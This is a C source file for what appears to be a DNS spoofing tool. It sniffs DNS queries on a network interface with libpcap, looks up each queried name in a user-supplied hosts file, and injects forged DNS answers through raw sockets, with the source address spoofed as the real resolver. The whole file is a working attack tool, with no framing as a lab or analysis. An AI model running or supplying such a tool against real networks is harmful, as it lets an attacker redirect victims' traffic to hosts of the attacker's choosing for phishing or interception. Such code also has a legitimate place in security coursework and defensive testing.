#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <netinet/in.h>
#include <resolv.h>

#include "struct.h"

#define IP_SIZE 16
#define PKT_SIZE 8192
#define DNS_HEADER_SIZE 12
#define UDP_HEADER_SIZE 8
#define IP_HEADER_SIZE 20
#define ETHERNET_SIZE 14

void get_data(char* data, unsigned int size, char* src_ip, char* dst_ip, u_int16_t port) {
  struct ip *iph = (struct ip *) data;
  struct udphdr *udph = (struct udphdr *) (data + IP_HEADER_SIZE);
  unsigned long sum;
  int n;
  unsigned short *buf;

  iph->ip_hl = 5;
  iph->ip_v = 4;
  iph->ip_tos = 0;
  iph->ip_ttl = 255;
  iph->ip_len = IP_HEADER_SIZE + UDP_HEADER_SIZE + size;
  iph->ip_id = 0;
  iph->ip_off = 0;
  iph->ip_p = 17;
  iph->ip_sum = 0;
  iph->ip_src.s_addr = inet_addr(dst_ip);
  iph->ip_dst.s_addr = inet_addr(src_ip);

  buf = (unsigned short *) data;
  n = iph->ip_len >> 1;
  for (sum = 0; n > 0; n--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);

  iph->ip_sum = ~sum;

  udph->source = htons(53);
  udph->dest = htons(port);
  udph->len = htons(UDP_HEADER_SIZE + size);
  udph->check = 0;
}

unsigned int get_ans(char *ip, struct dns_header *dns, char* answer, char* request) {
  unsigned int size = 0;
  struct dns_query *query;
  unsigned char ans[4];

  sscanf(ip, "%d.%d.%d.%d", (int *)&ans[0], (int *)&ans[1], (int *)&ans[2], (int *)&ans[3]);
  query = (struct dns_query*)(((char*) dns) + DNS_HEADER_SIZE);

  memcpy(&answer[0], &dns->id, 2);
  memcpy(&answer[2], "\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00", 10);

  size = strlen(request) + 2;
  memcpy(&answer[12], query, size);
  size += 12;
  memcpy(&answer[size], "\x00\x01\x00\x01\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x22\x00\x04", 16);
  size += 16;
  memcpy(&answer[size], ans, 4);
  size += 4;

  return size;
}

void get_ip(u_int32_t int_ip, char* ip) {
  int i;
  int buf[4];

  for (i = 0; i < 4; i++) {
    buf[i] = (int_ip >> (i * 8)) & 0xff;
  }
  sprintf(ip, "%d.%d.%d.%d", buf[0], buf[1], buf[2], buf[3]);
}

void get_dns(const u_char *packet, struct dns_header **dns, struct dns_query *query, char* src_ip, char* dst_ip, u_int16_t *port) {
  struct iphdr *ip;
  struct udphdr *udp;
  unsigned int size;
  struct ethernet_header *etherhdr;

  etherhdr = (struct ethernet_header*)(packet);

  ip = (struct iphdr*)(((char*) etherhdr) + ETHERNET_SIZE);
  get_ip(ip->saddr, src_ip);
  get_ip(ip->daddr, dst_ip);

  size = ip->ihl * 4;
  udp = (struct udphdr *)(((char*) ip) + size);
  (*port) = ntohs((*(u_int16_t*)udp));

  *dns = (struct dns_header*)(((char*) udp) + UDP_HEADER_SIZE);

  query->qname = ((char*) *dns) + DNS_HEADER_SIZE;
}

void get_dns_req(struct dns_query *query, char *request) {
  unsigned int i, j, k;
  char *curr = query->qname;
  unsigned int size;

  size = curr[0];

  j = 0;
  i = 1;
  while (size > 0) {
    for (k = 0; k < size; k++) {
      request[j++] = curr[i + k];
    }
    request[j++] = '.';
    i += size;
    size = curr[i++];
  }
  request[--j] = '\0';
}

void send_response(char* ip, char* packet, u_int16_t port, int packlen) {
  struct sockaddr_in to_addr;
  int bytes;
  const int val = 1;

  to_addr.sin_family = AF_INET;
  to_addr.sin_port = htons(port);
  to_addr.sin_addr.s_addr = inet_addr(ip);

  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (sock < 0) {
    printf("Socket error");
    return;
  }

  if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &val, sizeof(int)) < 0) {
    printf("setsockopt error");
    return;
  }

  bytes = sendto(sock, packet, packlen, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
  if (bytes <= 0)
    printf("Error sending data");
}

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
  struct dns_query query;
  struct dns_header *dns;
  struct list *head, *curr;

  char data[PKT_SIZE];
  char* answer;
  unsigned int size;
  u_int16_t port;
  char req[100];
  char src_ip[IP_SIZE], dst_ip[IP_SIZE];

  memset(data, 0, PKT_SIZE);
  head = (struct list *) args;
  get_dns(packet, &dns, &query, src_ip, dst_ip, &port);
  get_dns_req(&query, req);

  curr = head;
  while (curr != NULL) {
    if (!strcmp(req, curr->host)) {
      answer = data + IP_HEADER_SIZE + UDP_HEADER_SIZE;
      size = get_ans(curr->ip, dns, answer, req);
      get_data(data, size, src_ip, dst_ip, port);
      size += (IP_HEADER_SIZE + UDP_HEADER_SIZE);
      send_response(src_ip, data, port, size);
      break;
    }
    curr = curr->next;
  }
}

struct list* init_hosts(char *filename) {
  FILE* file = fopen(filename, "r");
  if (file == NULL)
    return NULL;

  char line[256];
  struct list *curr, *head = NULL;

  while (fgets(line, sizeof(line), file)) {
    curr = (struct list *) malloc (sizeof(struct list));
    sscanf(line, "%s\t%s", curr->ip, curr->host);
    curr->next = head;
    head = curr;
  }

  fclose(file);
  return head;
}

int main(int argc, char **argv) {
  int opt = 0;
  char *interface = NULL;
  char *file = NULL;
  char *str = NULL;
  char expr[100];

  char err[PCAP_ERRBUF_SIZE];
  struct bpf_program filter;
  pcap_t *handle;
  bpf_u_int32 mask;
  bpf_u_int32 net;
  struct list *head = NULL, *curr;

  while ((opt = getopt(argc, argv, "i:f:")) != -1) {
    switch (opt) {
    case 'i':
      interface = optarg;
      break;
    case 'f':
      file = optarg;
      break;
    default:
      printf("Specify proper options\n");
      return 0;
    }
  }

  if (optind < argc - 1) {
    printf("Specify proper options\n");
    return 0;
  } else if (optind == argc - 1)
    str = argv[argc - 1];

  if (interface == NULL) {
    interface = pcap_lookupdev(err);
    if (interface == NULL) {
      printf("pcap_lookupdev error : %s\n", err);
      return 0;
    }
  }

  if ((head = init_hosts(file)) == NULL) {
    printf("Error opening file\n");
    return 0;
  }

  if (interface != NULL) {
    if (pcap_lookupnet(interface, &net, &mask, err) == -1) {
      printf("pcap_lookupnet error : %s\n", err);
      net = 0;
      mask = 0;
    }
    handle = pcap_open_live(interface, BUFSIZ, 1, 1, err);
    if (handle == NULL) {
      printf("pcap_open_live error : %s\n", err);
      return 0;
    }
  }

  sprintf(expr, "udp and dst port domain");
  if (str != NULL) {
    strcat(expr, " and ");
    strcat(expr, str);
  }


  if (pcap_compile(handle, &filter, expr, 0, net) == -1) {
    printf("pcap_compile error : %s\n", pcap_geterr(handle));
    return 0;
  }

  if (pcap_setfilter(handle, &filter) == -1) {
    printf("pcap_setfilter error : %s\n", pcap_geterr(handle));
    return 0;
  }

  pcap_loop(handle, -1, got_packet, (u_char *)head);
  pcap_close(handle);

  return 0;
}